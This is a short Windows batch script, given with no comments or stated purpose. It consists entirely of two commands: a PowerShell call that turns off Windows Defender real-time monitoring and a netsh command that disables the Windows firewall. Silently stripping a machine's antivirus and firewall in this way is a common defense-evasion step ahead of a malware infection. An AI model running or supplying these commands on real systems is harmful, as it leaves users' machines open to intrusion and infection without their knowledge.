@echo off


powershell  Set-MpPreference -DisableRealTimeMonitoring $true
netsh firewall set opmode disable